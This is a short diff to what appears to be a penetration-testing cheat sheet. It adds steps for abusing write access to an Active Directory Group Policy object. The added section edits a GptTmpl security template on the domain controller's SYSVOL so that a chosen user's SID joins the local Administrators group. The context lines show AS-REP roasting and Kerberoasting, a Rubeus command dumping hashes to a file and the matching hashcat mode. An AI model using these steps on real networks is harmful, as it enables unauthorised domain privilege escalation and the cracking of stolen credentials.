@@ -465,6 +465,14 @@ cat ~/.bash_history
 1. Set account to no-preauth, asrep roast, crack hash  
 1. Set SPN for account, kerberoast, crack hash  
 
+## AD - GPO GenericWrite
+1. `\\dc1\sysvol\domain.com\Policies\{policyID}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl`  
+1. Find SID of Domain Admins and target user  
+1. add the following  
+`[Group Membership]`  
+`*S-1-5-32-544__Memberof =`  
+`*S-1-5-32-544__Members = *S-1-5-21-3453094141-4163309614-2941200192-1104`  
+
 ## AD - No preauth ASREP
 	./Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat
 Crack with mode 18200  
